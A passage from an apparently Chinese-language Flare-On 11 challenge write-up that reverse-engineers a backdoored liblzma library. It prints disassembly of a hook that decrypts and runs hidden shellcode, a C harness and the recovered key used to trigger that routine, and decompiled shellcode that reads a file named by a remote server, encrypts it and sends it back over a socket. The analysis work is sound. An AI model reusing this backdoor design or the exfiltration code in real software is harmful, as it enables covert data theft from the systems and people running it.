+<p>之後進到了sub_9520(那猜測這東西就是decrypt shellcode的function)<br>之後會去call v13<br>也就是shellcode<br>這邊我們回去看assembly，嘗試從coredump紀錄的memory抓出可以用的東西<br>這裡是開頭，當他去call getuid後回傳值存到rax裡面，之後看eax是不是0，rbp是不是0xC5407A48，是的話就會跳進去shellcode的部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000009820 ; __unwind &#123;</span><br><span class="line">.text:0000000000009820                 endbr64</span><br><span class="line">.text:0000000000009824                 push    r15</span><br><span class="line">.text:0000000000009826                 push    r14</span><br><span class="line">.text:0000000000009828                 mov     r14, rcx</span><br><span class="line">.text:000000000000982B                 push    r13</span><br><span class="line">.text:000000000000982D                 mov     r13, rdx</span><br><span class="line">.text:0000000000009830                 push    r12</span><br><span class="line">.text:0000000000009832                 mov     r12d, edi</span><br><span class="line">.text:0000000000009835                 push    rbp</span><br><span class="line">.text:0000000000009836                 mov     rbp, rsi</span><br><span class="line">.text:0000000000009839                 push    rbx</span><br><span class="line">.text:000000000000983A                 mov     ebx, r8d</span><br><span class="line">.text:000000000000983D                 sub     rsp, 0F8h</span><br><span class="line">.text:0000000000009844                 mov     rax, fs:28h</span><br><span class="line">.text:000000000000984D                 mov     [rsp+128h+var_40], rax</span><br><span class="line">.text:0000000000009855                 xor     eax, eax</span><br><span class="line">.text:0000000000009857                 call    _getuid</span><br><span class="line">.text:000000000000985C                 lea     rsi, aRsaPublicDecry ; &quot;RSA_public_decrypt&quot;</span><br><span class="line">.text:0000000000009863                 test    eax, eax</span><br><span class="line">.text:0000000000009865                 jnz     short loc_9877</span><br><span class="line">.text:0000000000009867                 cmp     dword ptr [rbp+0], 0C5407A48h</span><br><span class="line">.text:000000000000986E                 jz      short loc_98C0</span><br></pre></td></tr></table></figure>
+
+<p>這裡在做的事基本上跟上述說明的一樣</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000098C0 loc_98C0:                               ; CODE XREF: sub_9820+4E↑j</span><br><span class="line">.text:00000000000098C0                 lea     r11, [rbp+24h]</span><br><span class="line">.text:00000000000098C4                 lea     r10, [rbp+4]</span><br><span class="line">.text:00000000000098C8                 xor     ecx, ecx</span><br><span class="line">.text:00000000000098CA                 lea     r15, [rsp+128h+var_108]</span><br><span class="line">.text:00000000000098CF                 mov     rdx, r11</span><br><span class="line">.text:00000000000098D2                 mov     rsi, r10</span><br><span class="line">.text:00000000000098D5                 mov     [rsp+128h+var_110], r11</span><br><span class="line">.text:00000000000098DA                 mov     rdi, r15</span><br><span class="line">.text:00000000000098DD                 mov     [rsp+128h+var_118], r10</span><br><span class="line">.text:00000000000098E2                 call    sub_93F0</span><br><span class="line">.text:00000000000098E7                 xor     r9d, r9d        ; offset</span><br><span class="line">.text:00000000000098EA                 mov     ecx, 22h ; &#x27;&quot;&#x27;  ; flags</span><br><span class="line">.text:00000000000098EF                 xor     edi, edi        ; addr</span><br><span class="line">.text:00000000000098F1                 movsxd  rsi, cs:dword_32360 ; len</span><br><span class="line">.text:00000000000098F8                 mov     r8d, 0FFFFFFFFh ; fd</span><br><span class="line">.text:00000000000098FE                 mov     edx, 7          ; prot</span><br><span class="line">.text:0000000000009903                 call    _mmap</span><br><span class="line">.text:0000000000009908                 movsxd  rdx, cs:dword_32360 ; n</span><br><span class="line">.text:000000000000990F                 lea     rsi, unk_23960  ; src</span><br><span class="line">.text:0000000000009916                 mov     rdi, rax        ; dest</span><br><span class="line">.text:0000000000009919                 call    _memcpy</span><br><span class="line">.text:000000000000991E                 movsxd  rdx, cs:dword_32360</span><br><span class="line">.text:0000000000009925                 mov     rdi, r15</span><br><span class="line">.text:0000000000009928                 mov     rsi, rax</span><br><span class="line">.text:000000000000992B                 mov     [rsp+128h+var_120], rax</span><br><span class="line">.text:0000000000009930                 call    sub_9520</span><br><span class="line">.text:0000000000009935                 mov     r8, [rsp+128h+var_120]</span><br><span class="line">.text:000000000000993A                 xor     eax, eax</span><br><span class="line">.text:000000000000993C                 call    r8</span><br><span class="line">.text:000000000000993F                 mov     r11, [rsp+128h+var_110]</span><br><span class="line">.text:0000000000009944                 mov     r10, [rsp+128h+var_118]</span><br><span class="line">.text:0000000000009949                 mov     rdi, r15</span><br><span class="line">.text:000000000000994C                 xor     ecx, ecx</span><br><span class="line">.text:000000000000994E                 mov     rdx, r11</span><br><span class="line">.text:0000000000009951                 mov     rsi, r10</span><br><span class="line">.text:0000000000009954                 call    sub_93F0</span><br><span class="line">.text:0000000000009959                 mov     r8, [rsp+128h+var_120]</span><br><span class="line">.text:000000000000995E                 movsxd  rdx, cs:dword_32360</span><br><span class="line">.text:0000000000009965                 mov     rdi, r15</span><br><span class="line">.text:0000000000009968                 mov     rsi, r8</span><br><span class="line">.text:000000000000996B                 call    sub_9520</span><br><span class="line">.text:0000000000009970                 jmp     loc_9870</span><br></pre></td></tr></table></figure>
+
+<p>之後進入，也就是透過dlsym解析成對應的function，之後call rax crash了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000009870 loc_9870:                               ; CODE XREF: sub_9820+150↓j</span><br><span class="line">.text:0000000000009870                 lea     rsi, name       ; &quot;RSA_public_decrypt &quot;</span><br><span class="line">.text:0000000000009877</span><br><span class="line">.text:0000000000009877 loc_9877:                               ; CODE XREF: sub_9820+45↑j</span><br><span class="line">.text:0000000000009877                 xor     edi, edi        ; handle</span><br><span class="line">.text:0000000000009879                 call    _dlsym</span><br><span class="line">.text:000000000000987E                 mov     r8d, ebx</span><br><span class="line">.text:0000000000009881                 mov     rcx, r14</span><br><span class="line">.text:0000000000009884                 mov     rdx, r13</span><br><span class="line">.text:0000000000009887                 mov     rsi, rbp</span><br><span class="line">.text:000000000000988A                 mov     edi, r12d</span><br><span class="line">.text:000000000000988D                 call    rax</span><br><span class="line">.text:000000000000988F                 mov     rbx, [rsp+128h+var_40]</span><br><span class="line">.text:0000000000009897                 xor     rbx, fs:28h</span><br><span class="line">.text:00000000000098A0                 jnz     loc_9975</span><br><span class="line">.text:00000000000098A6                 add     rsp, 0F8h</span><br><span class="line">.text:00000000000098AD                 pop     rbx</span><br><span class="line">.text:00000000000098AE                 pop     rbp</span><br><span class="line">.text:00000000000098AF                 pop     r12</span><br><span class="line">.text:00000000000098B1                 pop     r13</span><br><span class="line">.text:00000000000098B3                 pop     r14</span><br><span class="line">.text:00000000000098B5                 pop     r15</span><br><span class="line">.text:00000000000098B7                 retn</span><br></pre></td></tr></table></figure>
+
+<p>看到這裡應該是有點複雜了，所以我打算用動態的方式來去看，不過這是一個libc，所以我們寫一個簡單的libc program來去引用該libc<br>用dlopen開啟libc，之後去抓一個libc中隨便的function丟進dlsym來去抓到正確的libc位置<br>之後減去他的offset拿到libcbase，最後在找到decrypt函數的function跳進去就好了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">dlsym</span><span class="params">(<span class="type">void</span>* handle,<span class="type">const</span> <span class="type">char</span>* symbol)</span></span><br></pre></td></tr></table></figure>
+<p>該函數在&lt;dlfcn.h&gt;文件中。<br>handle是由dlopen打開動態鏈接庫後返回的指針，symbol就是要求獲取的函數的名稱，函數  返回值是void*,指向函數的地址，供調用使用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">function_t</span>)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *handle = dlopen(<span class="string">&quot;./liblzma.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span> (!handle) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: %s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">void</span> *symbol_address = dlsym(handle, <span class="string">&quot;lzma_crc64&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leaklibc: %p\n&quot;</span>, symbol_address);</span><br><span class="line">    <span class="type">void</span> *libcbase = (<span class="type">char</span> *)symbol_address<span class="number">-0x15240</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libcbase: %p\n&quot;</span>, libcbase);</span><br><span class="line">    <span class="type">function_t</span> func = (<span class="type">function_t</span>)((<span class="type">char</span> *)libcbase + <span class="number">0x9820</span>);</span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">    dlclose(handle);</span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這樣編譯debug腳本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o libczma_debugger exp.c -ldl -g</span><br></pre></td></tr></table></figure>
+
+<p>我們先來整理一下每個函數</p>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>函數名稱</th>
+<th>用途</th>
+<th>rdi</th>
+<th>rsi</th>
+<th>rdx</th>
+<th>rcx</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>sub_9820</td>
+<td>libc function</td>
+<td>a1</td>
+<td>a2</td>
+<td>a3</td>
+<td>a4</td>
+</tr>
+<tr>
+<td>sub_93F0</td>
+<td>推測是抓到key</td>
+<td>v14</td>
+<td>a2+1</td>
+<td>a2+9</td>
+<td>0LL</td>
+</tr>
+<tr>
+<td>mmap</td>
+<td>映射記憶體，存放shellcode</td>
+<td>0LL</td>
+<td>dword_32360</td>
+<td>7</td>
+<td>34</td>
+</tr>
+<tr>
+<td>memcpy</td>
+<td>copy shellcode到mmap memory上</td>
+<td>v12</td>
+<td>&amp;unk_23960</td>
+<td>dword_32360</td>
+<td>無</td>
+</tr>
+<tr>
+<td>sub_9520</td>
+<td>解密shellcode</td>
+<td>v14</td>
+<td>v13</td>
+<td>dword_32360</td>
+<td>無</td>
+</tr>
+</tbody></table>
+<p>有了上面函數狀況，我們就gdb來看看吧，由於不知道這些參數代表甚麼，所以先跟進去看sub_9820</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7f79820    endbr64 </span><br><span class="line">  0x7ffff7f79824    push   r15</span><br><span class="line">  0x7ffff7f79826    push   r14</span><br><span class="line">  0x7ffff7f79828    mov    r14, rcx      R14 =&gt; 1</span><br><span class="line">  0x7ffff7f7982b    push   r13</span><br><span class="line">  0x7ffff7f7982d    mov    r13, rdx      R13 =&gt; 0x7ffff7f79820 ◂— endbr64 </span><br><span class="line">  0x7ffff7f79830    push   r12</span><br><span class="line">  0x7ffff7f79832    mov    r12d, edi     R12D =&gt; 0xffffd6d0</span><br><span class="line">  0x7ffff7f79835    push   rbp</span><br><span class="line">  0x7ffff7f79836    mov    rbp, rsi      RBP =&gt; 0x55555555b0b0 ◂— &#x27;libcbase: 0x7ffff7f70000\n&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>首先關注的是call function的rsi<br>他會傳入 sub_93F0 的 a2+1、a2+9，大概就可以猜測出這是一個offset，也就定位到key的位置，而rsi會copy 到 rbp(0x7ffff7f79836)</p>
+<p>順帶一提，這邊想測試進到shellcode的部分，所以用這兩行跳過判斷</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set $rax = 0</span><br><span class="line">set &#123;int&#125; $rbp = 0xc5407a48</span><br></pre></td></tr></table></figure>
+
+<p>之後就會進到這塊，原本的rbp位置+0x4被推入了r10，r10移入rsi，call sub_93F0，所以rbp上那塊布局應該是前4byte是 0xc5407a48，之後開始是shellcode，Dword(4 byte) * 8 &#x3D; 32是key長度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  0x7ffff7f798c0    lea    r11, [rbp + 0x24]               R11 =&gt; 0x55555555b0d4 ◂— 0</span><br><span class="line">  0x7ffff7f798c4    lea    r10, [rbp + 4]                  R10 =&gt; 0x55555555b0b4 ◂— &#x27;base: 0x7ffff7f70000\n&#x27;</span><br><span class="line">  0x7ffff7f798c8    xor    ecx, ecx                        ECX =&gt; 0</span><br><span class="line">  0x7ffff7f798ca    lea    r15, [rsp + 0x20]               R15 =&gt; 0x7fffffffdb20 —▸ 0x7fffffffdc50 ◂— 1</span><br><span class="line">  0x7ffff7f798cf    mov    rdx, r11                        RDX =&gt; 0x55555555b0d4 ◂— 0</span><br><span class="line">► 0x7ffff7f798d2    mov    rsi, r10                        RSI =&gt; 0x55555555b0b4 ◂— &#x27;base: 0x7ffff7f70000\n&#x27;</span><br><span class="line">  0x7ffff7f798d5    mov    qword ptr [rsp + 0x18], r11     [0x7fffffffdb18] =&gt; 0x55555555b0d4 ◂— 0</span><br><span class="line">  0x7ffff7f798da    mov    rdi, r15                        RDI =&gt; 0x7fffffffdb20 —▸ 0x7fffffffdc50 ◂— 1</span><br><span class="line">  0x7ffff7f798dd    mov    qword ptr [rsp + 0x10], r10     [0x7fffffffdb10] =&gt; 0x55555555b0b4 ◂— &#x27;base: 0x7ffff7f70000\n&#x27;</span><br><span class="line">  0x7ffff7f798e2    call   0x7ffff7f793f0              &lt;0x7ffff7f793f0&gt;</span><br></pre></td></tr></table></figure>
+<p>當我們回去看coredump時，發現rbp仍指向key位置，所以就把他dump下來(我多dump了一點)</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/9.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/9.png" class=""></div>
+
+
+<p>這邊修改一下Debug腳本(前四byte+key)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> key[] = <span class="string">&quot;\x48\x7a\x40\xc5&quot;</span></span><br><span class="line">             <span class="string">&quot;\x94\x3d\xf6\x38&quot;</span></span><br><span class="line">             <span class="string">&quot;\xa8\x18\x13\xe2&quot;</span></span><br><span class="line">             <span class="string">&quot;\xde\x63\x18\xa5&quot;</span></span><br><span class="line">             <span class="string">&quot;\x07\xf9\xa0\xba&quot;</span></span><br><span class="line">             <span class="string">&quot;\x2d\xbb\x8a\x7b&quot;</span></span><br><span class="line">             <span class="string">&quot;\xa6\x36\x66\xd0&quot;</span></span><br><span class="line">             <span class="string">&quot;\x8d\x11\xa6\x5e&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>另外我發現main第一個參數應該是shellcode長度，這邊填入0xf96</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dword_32360     dd <span class="number">0F</span>96h </span><br></pre></td></tr></table></figure>
+
+<p>不過還是怪怪的，最後我發現key長度應該要是48 byte(看coredump記憶體上面的東西，直到48byte後才是正確的，所以修正一下)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*<span class="type">function_t</span>)</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *handle = dlopen(<span class="string">&quot;./liblzma.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span> (!handle) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Error: %s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">void</span> *symbol_address = dlsym(handle, <span class="string">&quot;lzma_crc64&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leaklibc: %p\n&quot;</span>, symbol_address);</span><br><span class="line">    <span class="type">void</span> *libcbase = (<span class="type">char</span> *)symbol_address<span class="number">-0x15240</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libcbase: %p\n&quot;</span>, libcbase);</span><br><span class="line">    <span class="type">function_t</span> func = (<span class="type">function_t</span>)((<span class="type">char</span> *)libcbase + <span class="number">0x9820</span>);</span><br><span class="line">	</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;\x48\x7a\x40\xc5&quot;</span></span><br><span class="line">		 <span class="string">&quot;\x94\x3d\xf6\x38\xa8\x18\x13\xe2\xde\x63\x18\xa5\x07\xf9\xa0\xba&quot;</span></span><br><span class="line">		 <span class="string">&quot;\x2d\xbb\x8a\x7b\xa6\x36\x66\xd0\x8d\x11\xa6\x5e\xc9\x14\xd6\x6f&quot;</span></span><br><span class="line">		 <span class="string">&quot;\xf2\x36\x83\x9f\x4d\xcd\x71\x1a\x52\x86\x29\x55\x58\x58\xd1\xb7&quot;</span></span><br><span class="line">		 <span class="string">&quot;\xf9\xa7\xc2\x0d\x36\xde\x0e\x19\xea\xa3\x05\x96\xda\x59\xb9\xb9&quot;</span>;</span><br><span class="line">    func(<span class="number">0xf96</span>, key);</span><br><span class="line"></span><br><span class="line">    dlclose(handle);</span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>shellcode部分看起來正常了，這樣我們就成功還原shellcode，只差看他在做甚麼了</p>
+<div class="img-item" data-src="/2024/11/13/FlareOn-11/10.png" data-sub-html=".caption"><img src="/2024/11/13/FlareOn-11/10.png" class=""></div>
+
+<p>用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dump binary memory output.bin 0x7ffff7ffa000 0x7ffff7ffaf90</span><br></pre></td></tr></table></figure>
+
+<p>dump完後加上elf的header</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">	incbin &quot;shellcode.bin&quot; </span><br></pre></td></tr></table></figure>
+<p>把他包成elf後就可以用IDA分析了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 -o shellcode.o shellcode.asm</span><br><span class="line">ld -o shellcode.elf shellcode.o</span><br></pre></td></tr></table></figure>
+
+<p>這邊是main function的部分，他會開個一socket，之後去call  client的chacha20(這裡我逆過了)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">MAIN</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> websocket_HANDLER; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// kr08_8</span></span><br><span class="line">  <span class="type">signed</span> __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> ubuf[<span class="number">32</span>]; <span class="comment">// [rsp+410h] [rbp-1278h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">16</span>]; <span class="comment">// [rsp+430h] [rbp-1258h] BYREF</span></span><br><span class="line">  <span class="type">char</span> filename[<span class="number">256</span>]; <span class="comment">// [rsp+440h] [rbp-1248h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4224</span>]; <span class="comment">// [rsp+540h] [rbp-1148h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+15C0h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_4; <span class="comment">// [rsp+15C4h] [rbp-C4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  websocket_HANDLER = WEBsocket_CONNECT();</span><br><span class="line">  v1 = sys_recvfrom(websocket_HANDLER, ubuf, <span class="number">0x20</span>uLL, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v2 = sys_recvfrom(websocket_HANDLER, v12, <span class="number">0xC</span>uLL, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = sys_recvfrom(websocket_HANDLER, &amp;size, <span class="number">4uLL</span>, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = sys_recvfrom(websocket_HANDLER, filename, size, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  filename[(<span class="type">int</span>)v4] = <span class="number">0</span>;</span><br><span class="line">  v5 = sys_open(filename, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  v6 = sys_read(v5, buf, <span class="number">0x80</span>uLL);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(buf) + <span class="number">1</span>;</span><br><span class="line">  size_4 = v7 - <span class="number">1</span>;</span><br><span class="line">  client_chacha20((__int64)&amp;buf[v7], (__int64)buf, ubuf, v12, <span class="number">0LL</span>);</span><br><span class="line">  sub_401D49((__int64)&amp;buf[v7], (__int64)buf, (__int64)buf, size_4);</span><br><span class="line">  v8 = sys_sendto(websocket_HANDLER, &amp;size_4, <span class="number">4uLL</span>, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = sys_sendto(websocket_HANDLER, buf, size_4, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">  websocket_close();</span><br><span class="line">  websocket_shutdown(websocket_HANDLER, (__int64)buf, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這裡追進去後他把key跟nonce傳進去了<code>ENC_CHACHA_F</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">client_chacha20</span><span class="params">(__int64 a1, __int64 a2, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">const</span> <span class="type">void</span> *nonce, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v5; <span class="comment">// rax</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0xC0</span>uLL);</span><br><span class="line">  ENC_CHACHA_F((__int64)(v5 + <span class="number">48</span>), a5, key, nonce);</span><br><span class="line">  v6[<span class="number">44</span>] = a5;</span><br><span class="line">  result = HIDWORD(a5) + (<span class="type">unsigned</span> <span class="type">int</span>)sub_401F20(v6 + <span class="number">45</span>);</span><br><span class="line">  v6[<span class="number">45</span>] = result;</span><br><span 